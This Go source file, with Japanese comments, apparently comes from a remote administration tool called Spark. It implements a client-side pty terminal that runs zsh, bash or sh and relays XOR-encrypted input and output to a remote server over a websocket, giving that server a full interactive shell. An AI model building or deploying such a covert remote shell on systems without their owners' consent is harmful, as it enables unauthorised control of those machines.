//go:build !windows

package terminal

import (
	"Spark/client/common"
	"Spark/modules"
	"Spark/utils"
	"Spark/utils/cmap"
	"encoding/hex"
	"os"
	"os/exec"
	"reflect"
	"time"

	"github.com/creack/pty"
)

/*
Windows以外のオペレーティングシステム（LinuxやmacOSなど）で動作する仮想端末（terminal）を実装しています。仮想端末は、リモートでシェル（zsh、bash、shなど）を操作するために利用されます。このコードは、仮想端末の初期化、入力処理、リサイズ、終了、ヘルスチェックといった操作を管理しています。
*/

/*
仮想端末の1つのセッションを表します。
escape: この端末セッションが終了するかどうかを表すフラグ。
lastPack: 最後にパケットを受信した時間。
rawEvent: イベントをバイナリ形式で保持する配列。
event: イベントID。
pty: 仮想端末のファイルハンドル。
cmd: 実行中のコマンド。
*/
type terminal struct {
	escape   bool
	lastPack int64
	rawEvent []byte
	event    string
	pty      *os.File
	cmd      *exec.Cmd
}

//
var terminals = cmap.New[*terminal]()
var defaultShell = ``

func init() {
	go healthCheck()
}

/*
新しい端末セッションを初期化します。
使用可能なシェル（zsh、bash、sh）を探して、仮想端末を開始します。
pty.Start を使って仮想端末を起動し、端末セッションを作成します。
読み取りループで、端末からの出力を監視し、1KB以上のデータはバイナリデータとして、1KB未満のデータはJSON形式でリモートに送信します。
*/
func InitTerminal(pack modules.Packet) error {
	// try to get shell
	// if shell is not found or unavailable, then fallback to `sh`
	cmd := exec.Command(getTerminal(false))
	ptySession, err := pty.Start(cmd)
	if err != nil {
		defaultShell = getTerminal(true)
		return err
	}
	rawEvent, _ := hex.DecodeString(pack.Event)
	session := &terminal{
		cmd:      cmd,
		pty:      ptySession,
		event:    pack.Event,
		lastPack: utils.Unix,
		rawEvent: rawEvent,
		escape:   false,
	}
	terminals.Set(pack.Data[`terminal`].(string), session)
	go func() {
		bufSize := 1024
		for !session.escape {
			buffer := make([]byte, bufSize)
			n, err := ptySession.Read(buffer)
			buffer = buffer[:n]

			// if output is larger than 1KB, then send binary data
			if n > 1024 {
				if bufSize < 32768 {
					bufSize *= 2
				}
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 00)
			} else {
				bufSize = 1024
				buffer, _ = utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_OUTPUT`, Data: map[string]any{
					`output`: hex.EncodeToString(buffer),
				}})
				buffer = utils.XOR(buffer, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, buffer, 21, 01)
			}

			session.lastPack = utils.Unix
			if err != nil {
				if !session.escape {
					session.escape = true
					doKillTerminal(session)
				}
				data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`})
				data = utils.XOR(data, common.WSConn.GetSecret())
				common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
				break
			}
		}
	}()

	return nil
}

func InputRawTerminal(input []byte, uuid string) {
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	session.pty.Write(input)
	session.lastPack = utils.Unix
}

/*
クライアントから端末への入力を処理します。
クライアントから受信した入力をデコードし、仮想端末に書き込みます。
*/
func InputTerminal(pack modules.Packet) {
	var err error
	var uuid string
	var input []byte
	var session *terminal

	if val, ok := pack.GetData(`input`, reflect.String); !ok {
		return
	} else {
		if input, err = hex.DecodeString(val.(string)); err != nil {
			return
		}
	}
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
		if val, ok = terminals.Get(uuid); ok {
			session = val.(*terminal)
		} else {
			return
		}
	}
	session.pty.Write(input)
	session.lastPack = utils.Unix
}

/*
端末のウィンドウサイズを変更します。
pty.Setsize を使用して、行数や列数を設定します。
*/
func ResizeTerminal(pack modules.Packet) {
	var uuid string
	var cols, rows uint16
	var session *terminal
	if val, ok := pack.GetData(`cols`, reflect.Float64); !ok {
		return
	} else {
		cols = uint16(val.(float64))
	}
	if val, ok := pack.GetData(`rows`, reflect.Float64); !ok {
		return
	} else {
		rows = uint16(val.(float64))
	}

	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
		if val, ok = terminals.Get(uuid); ok {
			session = val.(*terminal)
		} else {
			return
		}
	}
	pty.Setsize(session.pty, &pty.Winsize{
		Cols: cols,
		Rows: rows,
	})
}

/*
仮想端末を終了します。
仮想端末を閉じ、セッション情報を削除し、リソースを解放します。
*/
func KillTerminal(pack modules.Packet) {
	var uuid string
	var session *terminal
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		uuid = val.(string)
	}
	session, ok := terminals.Get(uuid)
	if !ok {
		return
	}
	terminals.Remove(uuid)
	data, _ := utils.JSON.Marshal(modules.Packet{Act: `TERMINAL_QUIT`, Msg: `${i18n|TERMINAL.SESSION_CLOSED}`})
	data = utils.XOR(data, common.WSConn.GetSecret())
	common.WSConn.SendRawData(session.rawEvent, data, 21, 01)
	session.escape = true
	session.rawEvent = nil
}

/*
セッションがアクティブであることを確認します。
最後のアクティビティ時間を更新し、セッションの状態を保持します。
*/
func PingTerminal(pack modules.Packet) {
	var termUUID string
	if val, ok := pack.GetData(`terminal`, reflect.String); !ok {
		return
	} else {
		termUUID = val.(string)
	}
	session, ok := terminals.Get(termUUID)
	if !ok {
		return
	}
	session.lastPack = utils.Unix
}

/*
仮想端末を強制的に終了する処理を行います。
プロセスを強制終了し、リソースを解放します。
*/
func doKillTerminal(terminal *terminal) {
	terminal.escape = true
	if terminal.pty != nil {
		terminal.pty.Close()
	}
	if terminal.cmd.Process != nil {
		terminal.cmd.Process.Kill()
		terminal.cmd.Process.Wait()
		terminal.cmd.Process.Release()
		terminal.cmd.Process = nil
	}
}

/*
システムに存在するシェル（zsh、bash、sh）を検索し、そのパスを返します。
デフォルトで sh にフォールバックします。
*/
func getTerminal(sh bool) string {
	shellTable := []string{`zsh`, `bash`, `sh`}
	if sh {
		shPath, err := exec.LookPath(`sh`)
		if err != nil {
			return `sh`
		}
		return shPath
	} else if len(defaultShell) > 0 {
		return defaultShell
	}
	for i := 0; i < len(shellTable); i++ {
		shellPath, err := exec.LookPath(shellTable[i])
		if err == nil {
			defaultShell = shellPath
			return shellPath
		}
	}
	return `sh`
}

/*
端末セッションのヘルスチェックを行います。
最後のパケット受信から一定時間（300秒）が経過しているセッションを終了します。
*/
func healthCheck() {
	const MaxInterval = 300
	for now := range time.NewTicker(30 * time.Second).C {
		timestamp := now.Unix()
		// stores sessions to be disconnected
		queue := make([]string, 0)
		terminals.IterCb(func(uuid string, session *terminal) bool {
			if timestamp-session.lastPack > MaxInterval {
				queue = append(queue, uuid)
				doKillTerminal(session)
			}
			return true
		})
		for i := 0; i < len(queue); i++ {
			terminals.Remove(queue[i])
		}
	}
}
